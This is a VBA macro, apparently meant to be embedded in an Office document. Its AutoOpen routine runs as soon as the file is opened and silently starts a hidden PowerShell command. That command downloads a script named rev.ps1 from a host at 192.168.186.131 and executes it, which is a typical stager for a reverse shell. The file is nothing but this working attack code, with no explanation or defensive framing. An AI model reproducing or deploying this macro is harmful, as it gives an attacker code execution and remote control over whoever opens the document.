Sub AutoOpen()
    Call Macro_Mark_4
End Sub

Sub Macro_Mark_4()
'
' Macro_Mark_4 Macro
'
'



Set shell_object = CreateObject("WScript.Shell")
shell_object.Run "powershell.exe iwr 192.168.186.131/rev.ps1 | iex",0
End Sub